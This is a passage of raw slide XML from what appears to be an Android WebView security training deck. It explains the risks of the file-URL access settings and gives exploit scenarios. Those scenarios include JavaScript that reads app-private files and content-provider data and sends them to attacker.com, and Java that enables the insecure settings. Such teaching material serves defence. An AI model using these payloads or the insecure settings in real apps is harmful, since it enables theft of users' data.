              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>( </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "&lt;html&gt;&lt;body&gt;" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "&lt;script&gt;" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "fetch(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>content://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>com.example.vulnerable.provider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/secrets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>')" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  ".then(res =&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>res.text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>())" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  ".then(data =&gt; fetch('https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>steal?data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>=' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>encodeURIComponent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(data)))" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "&lt;/script&gt;" + </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  "&lt;/body&gt;&lt;/html&gt;", "text/html", "utf-8" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B4B82D8-7223-2FA8-4EB2-E26979D7BCCC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1847107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C46B1-3C2C-AC22-2D73-587FADA101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DD1E52-F348-C230-70D8-C5F4B95FCE37}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2088108" y="546691"/>
            <a:ext cx="7546040" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setAllowFileAccessFromFileURLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(true)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC912685-1D8F-7931-83C4-F901D71FE0AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="222976" y="1720840"/>
            <a:ext cx="4913195" cy="4247317"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>What it does</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: Allows a page loaded from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>file://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> to access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>other local files</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via JavaScript. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Risk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: Very dangerous. If an attacker loads a malicious HTML file from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>file://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, it can read files from app storage. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>🔥 Exploit Scenario:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Suppose an attacker somehow gets your app to load their malicious file from the file system (like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>file:///sdcard/evil.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Note</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> - Local files can be read using attacker-controlled HTML files. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{399DBABE-67B7-9819-725E-71EF800E49DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5404449" y="1720840"/>
            <a:ext cx="6564575" cy="3416320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;!--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file:///</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sdcard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>evil.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>--&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;html&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;body&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;script&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>fetch('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file:///data/data/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>com.example.app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/files/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>config.json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>') </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  .then(res =&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>res.text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>()) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>  .then(data =&gt; fetch('https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>steal?data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>=' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>encodeURIComponent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(data))); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;/script&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;/body&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;/html&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A318175-CFA8-14EE-B8F2-FB8910D9680A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5479543" y="5143857"/>
            <a:ext cx="6414385" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Java code: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>setAllowFileAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(true); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>setAllowFileAccessFromFileURLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>(true); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>webView.loadUrl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file:///</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sdcard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>evil.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>"); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18DDAABC-4525-02C5-5E92-B6C894640BB2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2623078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A8F1B-B4E8-BDD4-C509-2B3C9C766C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09DE418-20EB-8F78-7042-0EE5C599A270}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1282889" y="421481"/>
            <a:ext cx="8830101" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setAllowUniversalAccessFromFileURLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(true)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD353A60-0AA4-CDF8-0CD1-8D19A5BE0E60}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="204714" y="1635204"/>
            <a:ext cx="4913195" cy="3970318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>What it does</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: Allows a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>file://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> loaded page to make requests to internet URLs (e.g., fetch data from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Risk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: This bypasses the same-origin policy. An attacker can load local files and then exfiltrate data to the internet — full remote exploit. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>Note</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> – </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>This combo lets an attacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>load local fil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>es and send them to the internet — no user interaction needed. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85CD5668-3BBC-A986-1410-B209FDF9AC24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5199958" y="1635204"/>
            <a:ext cx="6359861" cy="3693319"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>🔥 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit Scenario:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;!-- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file:///</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sdcard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/evil2.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>--&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;html&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;body&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;script&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>fetch('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>file:///data/data/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>com.example.app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/files/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>secret.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>') </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
